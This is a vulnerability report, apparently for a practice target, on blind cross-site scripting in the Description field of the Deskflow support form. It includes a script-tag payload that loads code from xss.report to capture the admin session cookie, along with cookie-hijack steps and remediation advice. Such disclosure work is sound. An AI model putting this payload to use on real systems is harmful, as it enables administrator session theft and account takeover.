## Title
Blind XSS - Deskflow

## Description
**Affected URL:** https://deskflow.pwnedbox.site/

**Affected Parameter / Field:** `Description` (Contact Support Form)  

**Vulnerability Type:** Blind Cross-Site Scripting (Blind XSS) -> Admin Account Takeover

A **Blind Cross-Site Scripting (XSS)** vulnerability exists in the **Description** field of the **Tell us how we can help** support form (`https://deskflow.pwnedbox.site`). User-supplied input submitted through the public request form is stored in the backend database and rendered unescaped inside the administrative ticket detail page (`/admin/view.php?id=<ID>`).

Because the `PHPSESSID` session cookie lacks the `HttpOnly` flag and the application fails to sanitize HTML tags or enforce a Content Security Policy, an unauthenticated attacker can inject an external script payload that executes automatically when a support agent or administrator views the ticket—exfiltrating the administrator's session cookie and enabling **full administrative account takeover**.

## Steps to Reproduce
1. Navigate to `https://deskflow.pwnedbox.site/request.php`, fill in valid details for **Email address**, **Your name**, and **Subject**, enter `'"><sCRipT src="https://xss.report/c/{account_name}"></sCRipT>` into the **Description** field, and click **Send request**.
2. Log in to the admin panel and click on the submitted ticket in the **Inbox** (`/admin/view.php?id=1`).
3. Observe on `xss.report` that the Blind XSS callback fires immediately, capturing the admin URL, screenshot, and non-`HttpOnly` `PHPSESSID` cookie (`96aba8cd9685f87fae704ea0f209e0cf`).
4. In an unauthenticated browser session, replace the `PHPSESSID` cookie value via DevTools (`Application -> Cookies`) with the captured admin `PHPSESSID` to confirm full administrative access.

## POC (Proof of Concept)
**1. Submit form with payload in description field**

<img width="1000" height="511" alt="download" src="https://github.com/user-attachments/assets/b3b76fee-e630-4605-a2aa-5f0a892453be" />


**2. Log in as admin and view the ticket**

<img width="1000" height="469" alt="download" src="https://github.com/user-attachments/assets/b128dfb5-79fd-42ab-803a-bdf1f6b6e965" />


**3. See that admin's cookie has been captured via xss.report**

<img width="1000" height="508" alt="download" src="https://github.com/user-attachments/assets/f8d01e8d-b2bf-486b-b313-cf64fcd4978f" />


**4. Use cookie of admin in normal user's browser session**

<img width="1000" height="468" alt="download" src="https://github.com/user-attachments/assets/dd701c09-4664-483d-a6c6-09b16587107e" />


**5. Observe admin account takeover**

<img width="1000" height="466" alt="download" src="https://github.com/user-attachments/assets/9c39a7ea-a29e-44cb-a83b-0bfd8edc20c9" />


## Impact
An unauthenticated external attacker can achieve **full administrative account takeover** without needing prior credentials or user interaction beyond normal administrative workflow (viewing incoming support tickets). Successful exploitation allows an attacker to:
* Steal active administrator session cookies (`PHPSESSID`) and hijack privileged admin sessions.
* View, modify, or delete all confidential customer support tickets and sensitive user data.
* Deface the website or pivot to further server-side attacks from the authenticated admin panel.

## Remediation
* **Context-Aware Output Encoding:** Encode all user-supplied support request fields (including `Description`, `Your name`, `Email address`, and `Subject`) using HTML entity encoding (`<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, `'` to `&#x27;`) before rendering them inside `/admin/view.php` and `/admin/index.php`.
* **Set `HttpOnly` and `Secure` Cookie Flags:** Configure the `PHPSESSID` session cookie with `HttpOnly`, `Secure`, and `SameSite=Strict` (or `Lax`) attributes so sensitive session tokens cannot be read via `document.cookie`.
* **Implement Content Security Policy (CSP):** Configure a strict `Content-Security-Policy` HTTP response header (e.g., `default-src 'self'; script-src 'self'`) to block unauthorized external script domains and inline JavaScript execution.
